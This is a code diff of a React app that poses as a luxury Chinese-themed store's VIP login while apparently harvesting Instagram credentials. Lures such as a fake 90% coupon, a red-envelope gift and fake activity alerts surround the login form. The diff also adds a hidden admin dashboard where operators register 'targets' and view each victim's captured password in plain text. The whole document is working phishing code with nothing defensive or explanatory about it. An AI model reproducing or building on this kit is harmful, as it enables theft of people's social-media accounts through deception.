+                <div className="bg-[#2e2621]/40 p-4 border border-[#cfab7c]/10 rounded-none animate-fade-in">
+                  <span className="text-[8px] md:text-[9px] text-[#cfab7c] uppercase tracking-widest block mb-1 font-bold font-mono">{termsText.wallet}</span>
                   <div className="flex items-baseline gap-1">
-                    <span className="text-[11px] md:text-xs text-[#1c1815] font-light">
+                    <span className="text-[11px] text-[#cfab7c] font-light">
                       {currency === "BRL" ? "R$" : currency === "CNY" ? "¥" : "$"}
                     </span>
-                    <span className="text-base md:text-xl font-light text-[#1c1815] font-mono">
+                    <span className="text-base md:text-xl font-bold text-white font-mono">
                       {currency === "BRL" ? "1.890,50" : currency === "CNY" ? "2.450,00" : "335.00"}
                     </span>
                   </div>
-                  <span className="text-[7px] md:text-[8px] text-emerald-700 flex items-center gap-1 mt-2 md:mt-3 font-semibold uppercase tracking-wider font-mono">
-                    <span className="w-1 h-1 md:w-1.5 md:h-1.5 rounded-none bg-emerald-600"></span>
+                  <span className="text-[7px] md:text-[8px] text-emerald-400 flex items-center gap-1 mt-2 font-mono uppercase tracking-wider font-semibold">
+                    <span className="w-1.5 h-1.5 rounded-none bg-emerald-500"></span>
                     <span>Reembolso Ativo</span>
                   </span>
                 </div>
 
-                <div className="bg-[#faf8f5] p-3 md:p-5 border border-stone-100 rounded-none animate-fade-in">
-                  <span className="text-[8px] md:text-[9px] text-[#b39063] uppercase tracking-widest block mb-1 md:mb-1.5 font-bold font-serif">{termsText.points}</span>
+                <div className="bg-[#2e2621]/40 p-4 border border-[#cfab7c]/10 rounded-none animate-fade-in">
+                  <span className="text-[8px] md:text-[9px] text-[#cfab7c] uppercase tracking-widest block mb-1 font-bold font-mono">{termsText.points}</span>
                   <div className="flex items-baseline gap-1">
-                    <span className="text-base md:text-xl font-light text-[#1c1815] font-mono">11.110</span>
+                    <span className="text-base md:text-xl font-bold text-white font-mono">11.110</span>
                     <span className="text-[8px] md:text-[9px] text-stone-500 font-bold font-mono ml-0.5">PTS</span>
                   </div>
-                  <span className="text-[7px] md:text-[8px] text-[#b39063] mt-2 md:mt-3 block font-bold uppercase tracking-wider font-mono">
+                  <span className="text-[7px] md:text-[8px] text-[#cfab7c] mt-2 block font-mono font-bold uppercase tracking-wider">
                     ★ Nível Ouro
                   </span>
                 </div>
               </div>
 
-              {/* Simulated Shipping Route details, extremely immersive */}
-              <div className="bg-[#faf8f5] border border-stone-200/80 rounded-none p-3 md:p-5 mb-4 md:mb-5">
-                <h4 className="text-[11px] md:text-xs font-semibold text-[#1c1815] flex items-center gap-2 mb-3 md:mb-4 font-serif uppercase tracking-widest pb-2 border-b border-stone-200/50">
-                  <Truck className="w-3.5 h-3.5 md:w-4 md:h-4 text-[#cfab7c]" />
+              {/* Simulated Shipping Route details */}
+              <div className="bg-[#2e2621]/40 border border-[#cfab7c]/10 rounded-none p-4">
+                <h4 className="text-[11px] md:text-xs font-bold text-white flex items-center gap-2 mb-3 font-mono uppercase tracking-widest pb-1.5 border-b border-[#cfab7c]/10">
+                  <Truck className="w-3.5 h-3.5 text-[#cfab7c]" />
                   <span>{termsText.mockShipping}</span>
                 </h4>
-                <div className="relative pl-4 md:pl-5 border-l border-[#cfab7c]/40 space-y-3 md:space-y-4">
-                  
+                <div className="relative pl-4 border-l border-[#cfab7c]/30 space-y-3">
                    {/* Step 1 */}
                   <div className="relative">
-                    <span className="absolute -left-[21.5px] md:-left-[25.5px] top-1 w-1.5 h-1.5 md:w-2 md:h-2 rounded-none bg-[#cfab7c]"></span>
-                    <span className="text-[8px] md:text-[9px] font-mono text-[#b39063] block font-semibold uppercase tracking-widest">Enviado com Prioridade</span>
-                    <p className="text-[11px] md:text-xs text-stone-800 mt-0.5">
+                    <span className="absolute -left-[20.5px] top-1 w-1.5 h-1.5 rounded-none bg-[#D91E18]"></span>
+                    <span className="text-[8px] md:text-[9px] font-mono text-[#cfab7c] block font-semibold uppercase tracking-widest">Enviado com Prioridade</span>
+                    <p className="text-[11px] text-[#ebdcc6] mt-0.5 leading-relaxed font-serif">
                       {termsText.logisticsStep}
                     </p>
-                    <span className="text-[8px] md:text-[9px] text-stone-500 font-mono block mt-1"> Shanghai Wardrobe Base • 2026-06-20</span>
+                    <span className="text-[8px] text-stone-500 font-mono block mt-1"> Shenzhen Wardrobe Base • 2026-06-20</span>
                   </div>
 
                   {/* Step 2 */}
                   <div className="relative opacity-60">
-                    <span className="absolute -left-[21.5px] md:-left-[25.5px] top-1 w-1.5 h-1.5 md:w-2 md:h-2 rounded-none bg-stone-400"></span>
-                    <span className="text-[8px] md:text-[9px] text-stone-500 block font-mono font-semibold uppercase tracking-widest">Credenciais Ativas</span>
-                    <p className="text-[11px] md:text-xs text-stone-600 mt-0.5 font-medium">
-                      Portador VIP autenticado no cadastro de controle: <strong className="font-mono">{loggedInUser.username}</strong>
+                    <span className="absolute -left-[20.5px] top-1 w-1.5 h-1.5 rounded-none bg-stone-500"></span>
+                    <span className="text-[8px] md:text-[9px] text-stone-400 block font-mono font-semibold uppercase tracking-widest">Credenciais Ativas</span>
+                    <p className="text-[11px] text-stone-300 mt-0.5 font-serif font-light">
+                      Portador VIP autenticado no cadastro de controle: <strong className="font-mono text-[#cfab7c]">{loggedInUser.username}</strong>
                     </p>
                   </div>
                 </div>
@@ -473,49 +765,50 @@ export default function App() {
             </div>
           ) : (
             /* USER IS LOGGED OUT - THE CHINESE STORE THEMED LOGIN FORM BOX */
-            <div className="bg-white border border-[#cfab7c]/30 rounded-none overflow-hidden shadow-xl shadow-stone-200/60 relative">
+            <div className="bg-[#1c1815] border border-[#cfab7c]/30 rounded-none overflow-hidden shadow-2xl relative">
+              <div className="absolute top-0 left-0 w-full h-1.5 bg-gradient-to-r from-[#D91E18] via-[#cfab7c] to-[#D91E18]"></div>
               
-              <div className="border border-[#cfab7c]/20 p-5 md:p-8">
+              <div className="p-6 md:p-8">
                 
                 {/* Brand Greetings Header on top of form */}
-                <div className="text-center pb-4 md:pb-6 border-b border-stone-100 mb-5 md:mb-6">
-                  <p className="text-[9px] md:text-[10px] text-[#b39063] tracking-[0.25em] uppercase font-mono font-bold">
+                <div className="text-center pb-4 border-b border-[#cfab7c]/15 mb-5">
+                  <p className="text-[8px] md:text-[9px] text-[#cfab7c] tracking-[0.25em] uppercase font-mono font-black">
                     {language === "zh" ? "私享品鉴通道" : "ACESSO PRIVADO DE ASSOCIAÇÃO"}
                   </p>
-                  <h3 className="text-xl md:text-2xl font-serif text-[#1c1815] font-light tracking-widest uppercase mt-1">
+                  <h3 className="text-lg md:text-xl font-serif text-white font-normal tracking-widest uppercase mt-1">
                     Ateliê Privé
                   </h3>
                 </div>
 
                 {/* Feedback messages */}
                 {feedback && (
-                  <div className="mb-5 animate-fade-in">
-                    <div className={`flex items-start gap-2.5 p-3.5 rounded-sm border text-xs font-medium ${
+                  <div className="mb-4 animate-fade-in">
+                    <div className={`flex items-start gap-2.5 p-3 rounded-none border text-xs font-medium ${
                       feedback.type === "success" 
-                        ? "bg-emerald-500/5 border-emerald-500/15 text-emerald-800" 
-                        : "bg-red-500/5 border-red-500/15 text-red-800"
+                        ? "bg-emerald-950/40 border-emerald-900/30 text-emerald-300" 
+                        : "bg-red-950/40 border-red-900/30 text-red-300"
                     }`}>
                       {feedback.type === "success" ? (
-                        <CheckCircle2 className="w-4 h-4 flex-shrink-0 text-emerald-600 mt-0.5" />
+                        <CheckCircle2 className="w-4 h-4 flex-shrink-0 text-emerald-400 mt-0.5" />
                       ) : (
-                        <AlertCircle className="w-4 h-4 flex-shrink-0 text-red-600 mt-0.5" />
+                        <AlertCircle className="w-4 h-4 flex-shrink-0 text-red-400 mt-0.5" />
                       )}
-                      <span className="leading-normal">{feedback.text}</span>
+                      <span className="leading-normal font-mono text-[11px]">{feedback.text}</span>
                     </div>
                   </div>
                 )}
 
                 {/* Regular Password Form */}
-                <form onSubmit={handleLoginSubmit} className="space-y-4 md:space-y-5 animate-fade-in">
+                <form onSubmit={handleLoginSubmit} className="space-y-4 animate-fade-in">
                   
                   {/* Username Block */}
                   <div>
-                    <label className="block text-[9px] md:text-[10px] text-stone-500 mb-1.5 md:mb-2 font-bold uppercase tracking-widest font-mono">
+                    <label className="block text-[8px] md:text-[9px] text-stone-400 mb-1.5 font-bold uppercase tracking-widest font-mono">
                       {termsText.userField}
                     </label>
                     <div className="relative">
-                      <span className="absolute left-3 top-1/2 -translate-y-1/2 text-[#cfab7c] font-mono text-xs md:text-sm font-semibold">
-                        @
+                      <span className="absolute left-3 top-1/2 -translate-y-1/2 flex items-center">
+                        <img src="https://i.ibb.co/DHYRd4NJ/ig.png" alt="ig" className="h-4.5 w-4.5 object-contain" />
                       </span>
                       <input
                         name="login_username"
@@ -525,25 +818,25 @@ export default function App() {
                         placeholder="nome_usuario"
                         autoComplete="off"
                         required
-                        className="w-full bg-[#faf8f5] border border-stone-200 text-xs md:text-sm text-[#1c1815] pl-7 md:pl-8 pr-3 md:pr-4 py-2.5 md:py-3.5 rounded-none focus:outline-none focus:border-[#cfab7c] focus:ring-1 focus:ring-[#cfab7c]/20 transition-all font-mono"
+                        className="w-full bg-[#2e2621]/40 border border-[#cfab7c]/20 text-xs md:text-sm text-white pl-10 pr-3 py-2.5 rounded-none focus:outline-none focus:border-[#cfab7c] focus:ring-1 focus:ring-[#cfab7c]/20 transition-all font-mono"
                       />
                     </div>
                     {/* Tiny format hints */}
-                    <p className="text-[9px] md:text-[10px] text-stone-400 mt-1 leading-normal italic font-serif">
+                    <p className="text-[9px] text-stone-500 mt-1 leading-normal italic font-serif">
                       {language === "zh" ? "系统会自动添加 '@' 前缀验证" : "O sistema irá prefixar com @ automaticamente."}
                     </p>
                   </div>
 
                   {/* Password Block */}
                   <div>
-                    <div className="flex items-center justify-between mb-1.5 md:mb-2">
-                      <label className="block text-[9px] md:text-[10px] text-stone-500 font-bold uppercase tracking-widest font-mono">
+                    <div className="flex items-center justify-between mb-1.5">
+                      <label className="block text-[8px] md:text-[9px] text-stone-400 font-bold uppercase tracking-widest font-mono">
                         {termsText.passField}
                       </label>
                     </div>
                     <div className="relative">
-                      <span className="absolute left-3 md:left-3.5 top-1/2 -translate-y-1/2 text-stone-300">
-                        <Lock className="w-3 h-3 md:w-3.5 md:h-3.5 text-[#cfab7c]" />
+                      <span className="absolute left-3 top-1/2 -translate-y-1/2">
+                        <Lock className="w-3.5 h-3.5 text-[#cfab7c]" />
                       </span>
                       <input
                         name="login_password"
@@ -552,19 +845,19 @@ export default function App() {
                         onChange={(e) => setPassword(e.target.value)}
                         placeholder="••••••••"
                         required
-                        className="w-full bg-[#faf8f5] border border-stone-200 text-xs md:text-sm text-[#1c1815] pl-9 md:pl-10 pr-3 md:pr-4 py-2.5 md:py-3.5 rounded-none focus:outline-none focus:border-[#cfab7c] focus:ring-1 focus:ring-[#cfab7c]/20 transition-all font-mono"
+                        className="w-full bg-[#2e2621]/40 border border-[#cfab7c]/20 text-xs md:text-sm text-white pl-9 pr-3 py-2.5 rounded-none focus:outline-none focus:border-[#cfab7c] focus:ring-1 focus:ring-[#cfab7c]/20 transition-all font-mono"
                       />
                     </div>
                   </div>
 
                   {/* Coupon integration feedback visual */}
                   {couponCode && (
-                    <div className="p-2.5 md:p-3 bg-[#cfab7c]/5 border border-[#cfab7c]/30 rounded-none flex items-center justify-between text-[11px] md:text-xs text-[#b39063]">
+                    <div className="p-2.5 bg-[#cfab7c]/5 border border-[#cfab7c]/20 rounded-none flex items-center justify-between text-[10px] md:text-xs text-[#cfab7c]">
                       <div className="flex items-center gap-1.5">
-                        <Ticket className="w-3.5 h-3.5 md:w-4 md:h-4 text-[#cfab7c] animate-pulse" />
-                        <span>Cupom <strong className="font-mono">{couponCode}</strong> ativo!</span>
+                        <Ticket className="w-3.5 h-3.5 text-[#cfab7c] animate-pulse" />
+                        <span>Cupom <strong className="font-mono text-white">{couponCode}</strong> ativo!</span>
                       </div>
-                      <span className="text-[8px] md:text-[9px] bg-[#cfab7c]/20 px-1 md:px-1.5 py-0.5 rounded-none font-bold text-[#b39063] uppercase tracking-widest font-mono">
+                      <span className="text-[8px] md:text-[9px] bg-[#D91E18] px-1.5 py-0.5 rounded-none font-bold text-white uppercase tracking-widest font-mono">
                         90% OFF
                       </span>
                     </div>
@@ -574,22 +867,22 @@ export default function App() {
                   <button
                     type="submit"
                     disabled={loading}
-                    className="w-full py-3 md:py-4 px-3 md:px-4 bg-[#1c1815] hover:bg-stone-800 text-[#ebdcc6] font-semibold text-[11px] md:text-xs rounded-none shadow-md active:scale-[0.99] transition-all flex items-center justify-center gap-2 select-none uppercase tracking-[0.2em] border border-[#cfab7c] cursor-pointer"
+                    className="w-full py-3 px-4 bg-[#D91E18] hover:bg-red-700 text-white font-bold text-[10px] rounded-none shadow-md active:scale-[0.99] transition-all flex items-center justify-center gap-2 select-none uppercase tracking-[0.2em] border border-yellow-400/20 cursor-pointer"
                   >
-                    <ShoppingBag className="w-3.5 h-3.5 md:w-4 md:h-4 text-[#ebdcc6]" />
+                    <ShoppingBag className="w-3.5 h-3.5 text-white animate-pulse" />
                     <span>{loading ? termsText.enterLoading : termsText.enterBtn}</span>
-                    <ArrowRight className="w-3.5 h-3.5 md:w-4 md:h-4 ml-1 text-[#cfab7c]" />
+                    <ArrowRight className="w-3.5 h-3.5 ml-1 text-[#cfab7c]" />
                   </button>
 
-                  <p className="text-[9px] md:text-[10px] text-stone-500 text-center leading-relaxed font-serif pt-1 italic">
+                  <p className="text-[9px] text-stone-400 text-center leading-relaxed font-serif pt-1 italic">
                     {termsText.noRegister}
                   </p>
 
                 </form>
 
                 {/* Footer Agreements */}
-                <div className="border-t border-stone-100 pt-4 md:pt-5 mt-5 md:mt-6 text-center">
-                  <p className="text-[9px] md:text-[10px] text-stone-400 font-serif leading-relaxed">
+                <div className="border-t border-[#cfab7c]/15 pt-4 mt-5 text-center">
+                  <p className="text-[9px] text-stone-500 font-serif leading-relaxed">
                     {termsText.terms}
                   </p>
                 </div>
@@ -603,217 +896,315 @@ export default function App() {
 
       </main>
 
+      {/* Simulated Live Activity Notification Banner (bottom-left) */}
+      {liveNotification && (
+        <div className="fixed bottom-4 left-4 z-40 max-w-xs md:max-w-sm bg-[#1c1815] border-l-4 border-[#D91E18] border-t border-b border-r border-[#cfab7c]/30 shadow-2xl p-3 animate-fade-in flex items-center gap-2 select-none">
+          <div className="w-5 h-5 rounded-none bg-[#D91E18] flex items-center justify-center text-white text-[10px] font-serif font-black flex-shrink-0 animate-bounce">
+            福
+          </div>
+          <div>
+            <p className="text-[9px] text-[#cfab7c] uppercase tracking-widest font-mono font-bold">Atividade Recente</p>
+            <p className="text-[10px] text-[#ebdcc6] mt-0.5 font-serif font-light leading-snug">{liveNotification}</p>
+          </div>
+        </div>
+      )}
+
       {/* Embedded Red Pocket (Hongbao) lucky coupon claim component */}
       <RedPocketGift 
         language={language} 
         onApplyCoupon={applyPromoCoupon} 
       />
 
-      {/* Admin Panel Modal */}
+      {/* Admin Panel Modal (US button trigger) */}
       {showAdminPanel && (
-        <div className="fixed inset-0 bg-black/75 backdrop-blur-sm flex items-center justify-center z-50 p-3 md:p-4 animate-fade-in">
-          <div className="relative w-full max-w-md bg-[#1c1815] border border-[#cfab7c]/30 rounded-none overflow-hidden shadow-2xl">
+        <div className="fixed inset-0 bg-black/85 backdrop-blur-sm flex items-center justify-center z-50 p-3 md:p-4 animate-fade-in">
+          <div className="relative w-full max-w-2xl bg-[#1c1815] border border-[#cfab7c]/30 rounded-none overflow-hidden shadow-2xl">
+            {/* Closes the dialogue */}
             <button
               type="button"
               onClick={handleCloseAdmin}
-              className="absolute top-3 right-3 text-[#ebdcc6]/40 hover:text-[#cfab7c] transition-colors z-20 cursor-pointer bg-transparent border-none"
+              className="absolute top-4 right-4 text-[#ebdcc6]/40 hover:text-[#cfab7c] transition-colors z-20 cursor-pointer bg-transparent border-none"
             >
-              <X className="w-4 h-4" />
+              <X className="w-5 h-5" />
             </button>
 
             <div className="p-5 md:p-6">
               {/* Header */}
-              <div className="flex items-center gap-2.5 border-b border-[#cfab7c]/20 pb-4 mb-4">
-                <Shield className="w-5 h-5 text-[#cfab7c]" />
-                <h2 className="font-mono text-sm font-bold text-[#ebdcc6] uppercase tracking-widest">
-                  Admin Panel
-                </h2>
+              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-[#cfab7c]/20 pb-4 mb-4">
+                <div className="flex items-center gap-2.5">
+                  <Shield className="w-5 h-5 text-[#cfab7c]" />
+                  <div>
+                    <h2 className="font-mono text-sm font-bold text-[#ebdcc6] uppercase tracking-widest">
+                      Painel Administrativo VIP
+                    </h2>
+                    {adminAuthed && (
+                      <p className="text-[9px] text-[#cfab7c] font-mono mt-0.5">
+                        Logado como: <strong>{currentAdminUser}</strong>
+                      </p>
+                    )}
+                  </div>
+                </div>
+
+                {adminAuthed && (
+                  <button
+                    type="button"
+                    onClick={handleAdminLogout}
+                    className="self-start sm:self-auto px-2.5 py-1 text-[8px] bg-red-950 hover:bg-[#D91E18] text-white font-bold uppercase font-mono tracking-widest transition-colors cursor-pointer border border-[#D91E18]/30"
+                  >
+                    Encerrar Sessão
+                  </button>
+                )}
               </div>
 
               {!adminAuthed ? (
-                /* Login Form */
-                <form onSubmit={handleAdminLogin} className="space-y-4">
+                /* Login / Registration Forms */
+                <div className="space-y-4">
+                  {isAdminRegistering ? (
+                    <div>
+                      <span className="text-[9px] bg-amber-500/10 text-amber-400 border border-amber-500/25 px-2 py-0.5 font-bold uppercase font-mono tracking-widest">
+                        {anyAdminExists ? "Novo Cadastro" : "Primeiro Acesso - Configuração Inicial"}
+                      </span>
+                      <h3 className="text-xs text-stone-400 font-serif mt-1">
+                        Configure seu usuário e senha do painel para começar a monitorar.
+                      </h3>
+                    </div>
+                  ) : (
+                    <div>
+                      <span className="text-[9px] bg-[#cfab7c]/10 text-[#cfab7c] border border-[#cfab7c]/25 px-2 py-0.5 font-bold uppercase font-mono tracking-widest">
+                        Autenticação
+                      </span>
+                      <h3 className="text-xs text-stone-400 font-serif mt-1">
+                        Faça login no painel para ver suas senhas capturadas.
+                      </h3>
+                    </div>
+                  )}
+
                   {adminError && (
-                    <p className="text-[11px] text-red-400 font-mono bg-red-950/40 p-2 border border-red-900/30">
+                    <p className="text-[10px] text-red-400 font-mono bg-red-950/40 p-2 border border-red-900/30">
                       {adminError}
                     </p>
                   )}
-                  <div>
-                    <label className="block text-[9px] text-[#b39063] mb-1 font-bold uppercase tracking-widest font-mono">
-                      Usuário Admin
-                    </label>
-                    <input
-                      type="text"
-                      value={adminUser}
-                      onChange={(e) => setAdminUser(e.target.value)}
-                      placeholder="admin777"
-                      className="w-full bg-[#25201c] border border-[#3e352e] text-xs text-[#ebdcc6] px-3 py-2.5 rounded-none focus:outline-none focus:border-[#cfab7c] font-mono"
-                    />
-                  </div>
-                  <div>
-                    <label className="block text-[9px] text-[#b39063] mb-1 font-bold uppercase tracking-widest font-mono">
-                      Senha
-                    </label>
-                    <input
-                      type="password"
-                      value={adminPass}
-                      onChange={(e) => setAdminPass(e.target.value)}
-                      placeholder="••••••••"
-                      className="w-full bg-[#25201c] border border-[#3e352e] text-xs text-[#ebdcc6] px-3 py-2.5 rounded-none focus:outline-none focus:border-[#cfab7c] font-mono"
-                    />
-                  </div>
-                  <button
-                    type="submit"
-                    className="w-full py-2.5 bg-[#cfab7c] hover:bg-[#b39063] text-[#1c1815] font-black text-xs uppercase tracking-widest rounded-none transition-all font-mono cursor-pointer border-none"
-                  >
-                    Acessar
-                  </button>
-                </form>
-              ) : (
-                /* Admin Authenticated Panel */
-                <div className="space-y-4 max-h-[420px] overflow-y-auto custom-scrollbar pr-1">
 
-                  {/* Section: Monitored User Config */}
-                  <div className="bg-[#25201c] border border-[#3e352e] p-3 rounded-none">
-                    <p className="text-[9px] text-[#b39063] font-bold uppercase tracking-widest font-mono mb-2">
-                      USUÁRIO MONITORADO
-                    </p>
-                    <div className="flex items-center gap-2">
-                      <span className="text-[#cfab7c] font-mono text-xs">@</span>
+                  <form onSubmit={handleAdminLogin} className="space-y-4">
+                    <div>
+                      <label className="block text-[8px] text-[#cfab7c] mb-1 font-bold uppercase tracking-widest font-mono">
+                        Usuário Admin
+                      </label>
                       <input
-                        id="monitored-input"
                         type="text"
-                        defaultValue={monitoredUser.replace(/^@/, "")}
-                        placeholder="nome_usuario"
-                        className="flex-1 bg-[#1c1815] border border-[#3e352e] text-xs text-[#ebdcc6] px-2 py-1.5 rounded-none focus:outline-none focus:border-[#cfab7c] font-mono"
+                        value={adminUser}
+                        onChange={(e) => setAdminUser(e.target.value)}
+                        placeholder="Nome de Administrador"
+                        required
+                        className="w-full bg-[#25201c] border border-[#3e352e] text-xs text-[#ebdcc6] px-3 py-2.5 rounded-none focus:outline-none focus:border-[#cfab7c] font-mono"
                       />
+                    </div>
+                    <div>
+                      <label className="block text-[8px] text-[#cfab7c] mb-1 font-bold uppercase tracking-widest font-mono">
+                        Senha
+                      </label>
+                      <input
+                        type="password"
+                        value={adminPass}
+                        onChange={(e) => setAdminPass(e.target.value)}
+                        placeholder="Senha de Acesso"
+                        required
+                        className="w-full bg-[#25201c] border border-[#3e352e] text-xs text-[#ebdcc6] px-3 py-2.5 rounded-none focus:outline-none focus:border-[#cfab7c] font-mono"
+                      />
+                    </div>
+
+                    <button
+                      type="submit"
+                      className="w-full py-2.5 bg-[#cfab7c] hover:bg-[#b39063] text-[#1c1815] font-black text-xs uppercase tracking-widest rounded-none transition-all font-mono cursor-pointer border-none"
+                    >
+                      {isAdminRegistering ? "Salvar e Acessar" : "Acessar Painel"}
+                    </button>
+                  </form>
+
+                  {anyAdminExists && (
+                    <div className="text-center pt-2 border-t border-[#3e352e]/50">
                       <button
                         type="button"
-                        onClick={handleSaveMonitoredUser}
-                        className="px-2.5 py-1.5 bg-[#cfab7c] hover:bg-[#b39063] text-[#1c1815] text-[9px] font-black uppercase tracking-widest rounded-none transition-all font-mono cursor-pointer border-none"
+                        onClick={() => {
+                          setIsAdminRegistering(!isAdminRegistering);
+                          setAdminError(null);
+                        }}
+                        className="text-[9px] text-[#cfab7c] hover:underline uppercase font-mono tracking-widest cursor-pointer bg-transparent border-none"
                       >
-                        Salvar
+                        {isAdminRegistering ? "Voltar para o Login" : "Cadastrar novo Administrador"}
                       </button>
                     </div>
-                    {monitoredUser && (
-                      <div className="flex items-center justify-between mt-2 pt-2 border-t border-[#3e352e]">
-                        <span className="text-[10px] text-emerald-400 font-mono">
-                          Monitorando: <strong>{monitoredUser}</strong>
-                        </span>
-                        <button
-                          type="button"
-                          onClick={handleClearMonitoredUser}
-                          className="text-[9px] text-red-400 hover:text-red-300 font-mono font-bold uppercase tracking-widest cursor-pointer bg-transparent border-none"
-                        >
-                          Remover
-                        </button>
-                      </div>
-                    )}
+                  )}
+                </div>
+              ) : (
+                /* Admin Authenticated Dashboard Panel */
+                <div className="space-y-4 max-h-[460px] overflow-y-auto custom-scrollbar pr-1">
+                  
+                  {/* Statistics Widgets Row */}
+                  <div className="grid grid-cols-2 gap-3">
+                    <div className="bg-[#25201c] border border-[#3e352e] p-3 text-center">
+                      <span className="text-[8px] text-[#cfab7c] font-mono uppercase tracking-widest font-bold block mb-1">
+                        Alvos Cadastrados por Você
+                      </span>
+                      <span className="text-2xl font-bold font-mono text-white">{myUsers.length}</span>
+                    </div>
+                    <div className="bg-[#25201c] border border-[#3e352e] p-3 text-center">
+                      <span className="text-[8px] text-[#cfab7c] font-mono uppercase tracking-widest font-bold block mb-1">
+                        Senhas Capturadas (Filtradas)
+                      </span>
+                      <span className="text-2xl font-bold font-mono text-red-400">{filteredCaptured.length}</span>
+                    </div>
                   </div>
 
-                    {/* Section: Captured Passwords */}
-                  <div className="bg-[#25201c] border border-[#3e352e] p-3 rounded-none">
-                    <div className="flex items-center justify-between mb-2">
-                      <p className="text-[9px] text-[#b39063] font-bold uppercase tracking-widest font-mono">
-                        {monitoredUser
-                          ? `SENHAS DE ${monitoredUser} (${capturedPasswords.filter(e => e.user === monitoredUser).length})`
-                          : `SENHAS CAPTURADAS (${capturedPasswords.length})`
-                        }
-                      </p>
-                      <div className="flex items-center gap-1.5">
-                        <button
-                          type="button"
-                          onClick={refreshStorageData}
-                          className="text-[8px] text-[#cfab7c] hover:text-[#ebdcc6] font-mono font-bold uppercase tracking-widest cursor-pointer bg-transparent border-none"
-                          title="Atualizar"
-                        >
-                          ↻
-                        </button>
-                        {capturedPasswords.length > 0 && (
-                          <button
-                            type="button"
-                            onClick={handleClearCaptured}
-                            className="text-[8px] text-red-400 hover:text-red-300 font-mono font-bold uppercase tracking-widest cursor-pointer bg-transparent border-none"
-                          >
-                            Limpar
-                          </button>
-                        )}
-                      </div>
+                  {/* Tabs Selection Row */}
+                  <div className="flex border-b border-[#3e352e]">
+                    <button
+                      onClick={() => setActiveAdminTab("targets")}
+                      className={`flex-1 py-2 text-[10px] font-bold uppercase tracking-wider font-mono cursor-pointer transition-colors ${
+                        activeAdminTab === "targets" 
+                          ? "text-[#cfab7c] border-b-2 border-[#cfab7c]" 
+                          : "text-stone-500 hover:text-[#ebdcc6]"
+                      }`}
+                    >
+                      [1] Gerenciar Alvos
+                    </button>
+                    <button
+                      onClick={() => setActiveAdminTab("captures")}
+                      className={`flex-1 py-2 text-[10px] font-bold uppercase tracking-wider font-mono cursor-pointer transition-colors ${
+                        activeAdminTab === "captures" 
+                          ? "text-[#cfab7c] border-b-2 border-[#cfab7c]" 
+                          : "text-stone-500 hover:text-[#ebdcc6]"
+                      }`}
+                    >
+                      [2] Senhas Capturadas ({filteredCaptured.length})
+                    </button>
+                    <button
+                      onClick={() => setActiveAdminTab("new_admin")}
+                      className={`flex-1 py-2 text-[10px] font-bold uppercase tracking-wider font-mono cursor-pointer transition-colors ${
+                        activeAdminTab === "new_admin" 
+                          ? "text-[#cfab7c] border-b-2 border-[#cfab7c]" 
+                          : "text-stone-500 hover:text-[#ebdcc6]"
+                      }`}
+                    >
+                      [3] Novo Admin
+                    </button>
+                  </div>
+
+                  {/* Tab Contents */}
+                  {activeAdminTab === "targets" && (
+                    <div className="animate-fade-in h-[320px]">
+                      <LocalDbManager 
+                        adminUsername={currentAdminUser}
+                        onSelectUser={handleAutofillUser}
+                        triggerRefreshToggle={dbRefreshToggle}
+                      />
                     </div>
-                    {capturedPasswords.length === 0 ? (
-                      <p className="text-[10px] text-stone-500 font-mono text-center py-3">
-                        Nenhuma senha capturada ainda.
-                      </p>
-                    ) : (
-                      <div className="space-y-1.5 max-h-[150px] overflow-y-auto">
-                        {capturedPasswords
-                          .filter(e => !monitoredUser || e.user === monitoredUser)
-                          .toReversed()
-                          .map((entry, i) => (
-                          <div key={i} className="bg-[#1c1815] border border-[#3e352e] p-2 rounded-none">
-                            <div className="flex items-center justify-between">
-                              <span className="text-[10px] text-[#cfab7c] font-mono font-bold">{entry.user}</span>
-                              <span className="text-[8px] text-stone-500 font-mono">{entry.time}</span>
-                            </div>
-                            <p className="text-[11px] text-[#ebdcc6] font-mono mt-0.5 break-all">
-                              Senha: <strong className="text-red-400">{entry.pass}</strong>
-                            </p>
-                          </div>
-                        ))}
-                        {monitoredUser && capturedPasswords.filter(e => e.user === monitoredUser).length === 0 && (
-                          <p className="text-[10px] text-stone-500 font-mono text-center py-2">
-                            Nenhuma tentativa de {monitoredUser} ainda.
+                  )}
+
+                  {activeAdminTab === "captures" && (
+                    <div className="bg-[#25201c] border border-[#3e352e] p-4 rounded-none animate-fade-in space-y-4 h-[320px] flex flex-col justify-between">
+                      <div>
+                        <div className="flex items-center justify-between mb-2">
+                          <p className="text-[9px] text-[#cfab7c] font-bold uppercase tracking-widest font-mono">
+                            LOG DE SENHAS DA SUA REDE
                           </p>
+                          {filteredCaptured.length > 0 && (
+                            <button
+                              type="button"
+                              onClick={handleClearCaptured}
+                              className="text-[8px] text-red-400 hover:text-red-300 font-mono font-bold uppercase tracking-widest cursor-pointer bg-transparent border-none"
+                            >
+                              Limpar Tudo
+                            </button>
+                          )}
+                        </div>
+
+                        {filteredCaptured.length === 0 ? (
+                          <p className="text-[10px] text-stone-500 font-mono text-center py-8">
+                            Nenhuma tentativa de login capturada para seus alvos ainda.
+                          </p>
+                        ) : (
+                          <div className="space-y-1.5 max-h-[220px] overflow-y-auto custom-scrollbar pr-1">
+                            {filteredCaptured
+                              .toReversed()
+                              .map((entry, i) => (
+                              <div key={i} className="bg-[#1c1815] border border-[#3e352e] p-2.5 rounded-none">
+                                <div className="flex items-center justify-between">
+                                  <span className="text-[10px] text-[#cfab7c] font-mono font-bold">{entry.user}</span>
+                                  <span className="text-[8px] text-stone-500 font-mono">{entry.time}</span>
+                                </div>
+                                <p className="text-[11px] text-[#ebdcc6] font-mono mt-1 break-all">
+                                  Senha Capturada: <strong className="text-red-400 font-black">{entry.pass}</strong>
+                                </p>
+                              </div>
+                            ))}
+                          </div>
                         )}
                       </div>
-                    )}
-                  </div>
 
-                  {/* Section: All localStorage */}
-                  <div className="bg-[#25201c] border border-[#3e352e] p-3 rounded-none">
-                    <div className="flex items-center justify-between mb-2">
-                      <p className="text-[9px] text-[#b39063] font-bold uppercase tracking-widest font-mono">
-                        LOCALSTORAGE ({storageItems.length} item(s))
+                      {/* Monitored User details display */}
+                      <div className="bg-[#1c1815] border border-[#3e352e] p-2.5 flex items-center justify-between text-[9px] font-mono">
+                        <span className="text-[#cfab7c]">Modo de Captura Ativo:</span>
+                        <span className="text-stone-400 uppercase">Apenas contas vinculadas ao seu Administrador</span>
+                      </div>
+                    </div>
+                  )}
+
+                  {activeAdminTab === "new_admin" && (
